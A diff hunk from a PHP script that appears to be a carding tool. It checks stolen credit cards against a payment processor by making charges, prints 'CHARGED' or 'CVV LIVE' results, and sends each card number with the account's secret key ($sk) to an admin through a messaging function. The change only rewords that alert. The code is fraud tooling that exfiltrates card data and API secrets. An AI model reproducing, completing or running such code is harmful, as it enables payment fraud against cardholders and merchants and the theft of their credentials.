@@ -151,7 +151,7 @@ break;
 
 if(strpos($result2, '"seller_message": "Payment complete."' )) {
     echo 'CHARGED</span>  </span>CC:  '.$lista.'</span>  <br>➤ Response: $'.$amt.' 𝔠𝔥𝔞𝔯𝔤𝔢𝔡 𝔟𝔶 @balenottere <br> ➤ Receipt : <a href='.$receipturl.'>Here</a><br>';
-    send_message($admin, "CC \nϲϲ ➔ <code>$lista</code>\nTYPE➠ Ccn $amt€ \nSK ➠ <code>$sk</code>");
+    send_message($admin, "charged found !!! \nϲϲ ➔ <code>$lista</code>\nTYPE➠ ccn $amt€ \nSK ➠ <code>$sk</code>");
 }
 elseif(strpos($result2,'"cvc_check": "pass"')){
     echo 'CVV</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVV LIVE</span><br>';
